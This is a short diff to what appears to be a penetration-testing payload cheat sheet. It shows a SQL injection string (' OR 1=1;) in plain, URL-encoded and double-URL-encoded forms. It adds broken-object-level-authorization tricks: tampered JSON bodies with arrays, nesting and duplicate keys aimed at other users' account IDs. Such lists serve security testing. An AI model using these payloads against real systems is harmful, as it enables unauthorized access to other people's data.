@@ -212,3 +212,11 @@ Double URL Encoded Payload
 ' OR 1=1;
 %27%20%4f%52%20%31%3d%31%3b
 %25%32%37%25%32%30%25%34%66%25%35%32%25%32%30%25%33%31%25%33%64%25%33%31%25%33%62
+
+BOLA:
+Valid Request:
+{"Account" : 2222}
+Try:
+{"Account" : [3333]}
+{"Account" : {"Account" : 3333}}
+{"Account" : 2222, "Account" : 3333, "Account" : 5555}
